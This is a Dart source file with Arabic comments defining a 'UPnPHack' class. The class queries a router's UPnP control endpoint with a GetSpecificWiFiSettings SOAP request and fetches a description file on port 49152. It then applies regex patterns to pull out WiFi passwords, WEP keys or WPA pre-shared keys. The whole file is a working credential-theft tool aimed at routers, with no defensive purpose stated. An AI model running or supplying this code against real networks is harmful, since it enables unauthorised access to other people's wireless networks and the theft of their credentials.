import 'dart:io';
import 'package:http/http.dart' as http;

class UPnPResult {
  final bool success;
  final String? password;
  
  UPnPResult({required this.success, this.password});
}

class UPnPHack {
  
  Future<UPnPResult> hackViaUPnP(String routerIp) async {
    try {
      // طلب SOAP للحصول على معلومات WiFi
      final soapRequest = '''
      <?xml version="1.0"?>
      <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body>
          <u:GetSpecificWiFiSettings xmlns:u="urn:schemas-upnp-org:service:WLANConfiguration:1">
            <NewInstanceID>0</NewInstanceID>
          </u:GetSpecificWiFiSettings>
        </s:Body>
      </s:Envelope>
      ''';
      
      final response = await http.post(
        Uri.parse('http://$routerIp:5000/upnp/control/WLANConfig1'),
        body: soapRequest,
        headers: {
          'Content-Type': 'text/xml; charset="utf-8"',
          'SOAPAction': '"urn:schemas-upnp-org:service:WLANConfiguration:1#GetSpecificWiFiSettings"',
        },
      ).timeout(Duration(seconds: 5));
      
      if (response.statusCode == 200) {
        final password = _extractPasswordFromSOAP(response.body);
        if (password != null) {
          return UPnPResult(success: true, password: password);
        }
      }
    } catch (_) {}
    
    // محاولة منفذ 49152 (شائع لـ UPnP)
    try {
      final response = await http.get(
        Uri.parse('http://$routerIp:49152/description.xml'),
      ).timeout(Duration(seconds: 3));
      
      if (response.statusCode == 200) {
        final password = _extractPasswordFromXML(response.body);
        if (password != null) {
          return UPnPResult(success: true, password: password);
        }
      }
    } catch (_) {}
    
    return UPnPResult(success: false);
  }
  
  String? _extractPasswordFromSOAP(String xml) {
    final patterns = [
      r'<NewPassword>(.*?)</NewPassword>',
      r'<NewWEPKey>(.*?)</NewWEPKey>',
      r'<NewPreSharedKey>(.*?)</NewPreSharedKey>',
      r'<NewWPAKey>(.*?)</NewWPAKey>',
    ];
    
    for (final pattern in patterns) {
      final match = RegExp(pattern, caseSensitive: false).firstMatch(xml);
      if (match != null) {
        final extracted = match.group(1)?.trim();
        if (extracted != null && extracted.isNotEmpty && extracted.length >= 8) {
          return extracted;
        }
      }
    }
    return null;
  }
  
  String? _extractPasswordFromXML(String xml) {
    final match = RegExp(r'WLANPassword["\s]*[:=]["\s]*([^"<&]+)', caseSensitive: false).firstMatch(xml);
    return match?.group(1);
  }
}
